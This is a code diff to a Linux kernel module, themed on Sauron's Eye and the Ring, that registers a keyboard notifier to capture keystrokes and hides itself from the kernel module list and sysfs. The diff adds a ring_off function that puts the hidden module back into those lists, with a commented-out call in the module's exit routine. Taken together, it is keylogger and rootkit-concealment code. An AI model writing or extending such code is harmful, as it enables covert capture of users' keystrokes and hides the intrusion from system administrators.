@@ -15,6 +15,7 @@ static int start_eye(void);
 static void end_eye(void);
 static int sauron_notify(struct notifier_block *nb, unsigned long code, void *data);
 void ring_on(void);
+void ring_off(void);
 
 module_init(start_eye);
 module_exit(end_eye);
@@ -37,6 +38,7 @@ static int start_eye(void)
 
 static void end_eye(void)
 {
+//    ring_off();
     unregister_keyboard_notifier(&_sauron);
     printk("You are free from the Eye.\n");
 }
@@ -75,4 +77,21 @@ void ring_on(void)
     kobject_del(&__this_module.mkobj.kobj);         /* Remove from sysfs */
 
     printk("The ring of power is applied.\n");
+}
+
+void ring_off(void)
+{
+    /* Add the LKM back into the system module list */
+    list_add(&__this_module.list, _module_list);
+    if (kobject_add(_kobj, _kobj_parent, "eye") == -EINVAL)
+    {
+        kobject_put(_kobj);
+        return;
+    }
+
+    /* Add the LKM back into the sysfs group */
+    sysfs_update_group(_kobj, _kgrp);
+    kobject_uevent(_kobj, KOBJ_ADD);
+
+    printk("The ring of power is removed.\n");
 }
